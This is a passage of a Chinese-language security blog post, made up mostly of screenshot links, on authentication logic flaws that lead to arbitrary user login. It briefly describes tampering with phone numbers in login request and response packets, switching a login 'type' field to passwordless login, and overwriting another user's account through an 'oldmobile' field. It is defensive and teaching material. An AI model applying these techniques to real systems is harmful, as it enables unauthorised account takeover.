<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002oT9dv1rrZTW.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002oT9dv1rrZTW.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002oT9dv1rrZTW.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003CNptr4QLUld.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003CNptr4QLUld.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003CNptr4QLUld.jpg">
        
    </a></p>
<p>所以此处只需要替换第一个请求包的返回包中的手机号即可</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001JHFHh2LjpJM.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001JHFHh2LjpJM.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001JHFHh2LjpJM.jpg">
        
    </a></p>
<h4 id="修改第二个请求的请求包" class="headerLink">
    <a href="#%e4%bf%ae%e6%94%b9%e7%ac%ac%e4%ba%8c%e4%b8%aa%e8%af%b7%e6%b1%82%e7%9a%84%e8%af%b7%e6%b1%82%e5%8c%85" class="header-mark"></a>修改第二个请求的请求包</h4><p>如下登录数据包，直接更改其中手机号即可</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001TXV1C3XB3Q8.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001TXV1C3XB3Q8.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001TXV1C3XB3Q8.jpg">
        
    </a></p>
<h3 id="32-更改登录type" class="headerLink">
    <a href="#32-%e6%9b%b4%e6%94%b9%e7%99%bb%e5%bd%95type" class="header-mark"></a>3.2 更改登录type</h3><p>部分系统有免密登录/快捷登录之类的功能，只要一个账号就能登录，当遇到登录数据包中含有type之类的字段时，可以尝试此方法</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000039QDx21hFYtx.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000039QDx21hFYtx.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000039QDx21hFYtx.jpg">
        
    </a></p>
<h3 id="33-账号数据覆盖" class="headerLink">
    <a href="#33-%e8%b4%a6%e5%8f%b7%e6%95%b0%e6%8d%ae%e8%a6%86%e7%9b%96" class="header-mark"></a>3.3 账号数据覆盖</h3><p>常见于用账号信息更新处，例如修改手机号、账户重新绑定功能、修改账号等功能点处</p>
<p>以修改手机号为例，此处修改需要输入新手机号与新手机号的验证码</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000SIWEa3YcdRV.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000SIWEa3YcdRV.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000SIWEa3YcdRV.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001L1Ho00CZCua.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001L1Ho00CZCua.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001L1Ho00CZCua.jpg">
        
    </a></p>
<p>修改请求中的oldmobile字段为其他手机号，成功将其他用户的账户数据覆盖到新手机号中，达到任意用户登录</p>]]></description>
</item></channel>
</rss>
